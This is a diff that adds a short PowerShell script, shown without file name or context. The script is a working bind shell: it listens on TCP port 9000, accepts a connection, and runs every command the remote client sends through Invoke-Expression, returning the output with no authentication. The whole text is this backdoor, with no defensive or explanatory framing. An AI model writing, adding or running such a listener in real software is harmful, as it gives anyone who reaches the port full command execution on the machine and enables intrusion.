@@ -1,0 +1,23 @@
+$listener = [System.Net.Sockets.TcpListener]::new(9000)
+$listener.Start()
+$client = $listener.AcceptTcpClient()
+$stream = $client.GetStream()
+$reader = [System.IO.StreamReader]::new($stream)
+$writer = [System.IO.StreamWriter]::new($stream)
+$writer.AutoFlush = $true
+
+while ($client.Connected) {
+    $writer.Write("PS " + (Get-Location).Path + "> ")
+    $command = $reader.ReadLine()
+    if ($command -eq "exit") { break }
+    
+    try {
+        $output = Invoke-Expression $command 2>&1 | Out-String
+        $writer.WriteLine($output)
+    } catch {
+        $writer.WriteLine("Error: $_")
+    }
+}
+
+$listener.Stop()
+$client.Close()
